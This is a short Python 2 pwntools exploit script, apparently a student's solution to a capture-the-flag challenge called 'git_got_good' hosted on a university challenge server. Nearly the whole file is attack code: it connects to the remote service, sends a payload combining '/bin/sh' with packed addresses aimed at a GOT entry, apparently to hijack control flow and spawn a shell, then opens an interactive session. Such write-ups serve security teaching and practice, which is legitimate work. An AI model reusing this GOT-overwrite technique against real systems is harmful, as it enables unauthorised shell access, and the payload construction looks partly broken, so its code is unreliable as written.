from pwn import *

username = 'tk1931'
binary_name = './git_got_good'


is_local    = False
is_local_dbg= False
remote_host = 'offsec-chalbroker.osiris.cyber.nyu.edu'
remote_port = 1341

gdb_script = '''set follow-fork-mode parent
b *0x00000004007F4
b *0x000000040080e
b *0x000000040075e
continue
'''

#somewhere
run_cmd     = 0
got_stuff   = 0


def gen_payload():
    payload = "/bin/sh" + chr(0)
    payload += str(p64(0x0040074b)) + str(p64(0x00601018 - 0x8))
    """
    Interesting behavior
    """
    return payload
    

def get_target():
    if(is_local):
        if(is_local_dbg):
            target = gdb.debug(binary_name, gdb_script)
        else:
            print 1
            target = process(binary_name)
        return target
    else:
        target = remote(remote_host, remote_port)
        target.sendline(username)
        print 0,target.recvline(timeout=5)
        return target


def main():
    target = get_target()
    print 1,target.recvline()
    print 2,target.recvline()
    target.sendline(gen_payload())
    target.interactive()

if __name__ == '__main__':
    main()
